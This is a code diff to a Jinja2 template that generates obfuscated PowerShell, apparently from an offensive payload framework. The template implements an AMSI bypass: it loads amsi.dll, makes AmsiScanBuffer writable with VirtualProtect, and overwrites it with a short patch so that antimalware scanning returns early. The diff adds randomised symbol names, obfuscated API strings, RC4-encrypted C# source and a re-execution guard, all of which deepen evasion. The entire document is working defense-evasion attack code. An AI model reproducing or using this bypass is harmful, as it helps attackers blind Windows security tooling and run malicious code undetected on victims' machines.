@@ -1,8 +1,13 @@
+{% from 'macros.jinja2' import obfuscate with context%}
+
+{# Because rasta mouse is always executed after the powershell-specific bypass to disable the process-specific AMSI, let's check if it already as been executed #}
+try { Get-Variable {{symbol_name("rastamouse")}} -ErrorAction Stop -Scope Global | Out-Null } catch {
+${{symbol_name("rastamouse")}} = $True
 {% set winpatch = '''
 using System;
 using System.Runtime.InteropServices;
 
-public class Win32 {
+public class ''' + symbol_name("Win32") + ''' {
 
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -16,25 +21,16 @@ public class Win32 {
 }
 ''' %}
 
-$Win32 = {{symbol_name("Decrypt-String")}} @"
+${{symbol_name("Win32")}} = {{symbol_name("Decrypt-String")}} @"
 {{winpatch|rc4encrypt}}
 "@
 
-Add-Type $Win32
+Add-Type ${{symbol_name("Win32")}}
 
-{% set strings = [
-    'amsi.dll',
-    'AmsiScanBuffer',
-] %}
-
-{% for s in strings %}
-    ${{symbol_name("rasta")}}string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
-{% endfor %}
-
-
-$Address = [Win32]::GetProcAddress([Win32]::LoadLibrary(${{symbol_name("rasta")}}string1), ${{symbol_name("rasta")}}string2)
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-
+${{symbol_name("address")}} = [{{symbol_name("Win32")}}]::{{obfuscate("GetProcAddress")}}([{{symbol_name("Win32")}}]::{{obfuscate("LoadLibrary")}}({{obfuscate("amsi.dll")}}), {{obfuscate("AmsiScanBuffer")}})
+${{symbol_name("nullpointer")}} = 0
+[{{symbol_name("Win32")}}]::{{obfuscate("VirtualProtect")}}(${{symbol_name("address")}}, [uint32]5, 0x40, [ref]${{symbol_name("nullpointer")}})
+${{symbol_name("bytes")}} = {{obfuscate("uFcAB4DD")}}
+${{symbol_name("patch")}} = [System.Convert]::{{obfuscate("FromBase64String")}}(${{symbol_name("bytes")}})
+[System.Runtime.InteropServices.Marshal]::{{obfuscate("Copy")}}(${{symbol_name("patch")}}, 0, ${{symbol_name("address")}}, 6)
+}
